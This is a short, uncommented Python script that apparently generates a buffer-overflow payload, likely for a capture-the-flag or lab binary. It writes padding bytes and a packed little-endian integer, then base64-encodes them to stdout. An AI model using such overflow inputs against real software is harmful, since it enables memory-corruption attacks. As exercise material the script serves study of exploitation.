
import sys
import struct
import base64

buf = b'fffffffffffffffffffffffffffffffffffffffffffffffff'
buf += struct.pack('<I', 912018348)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
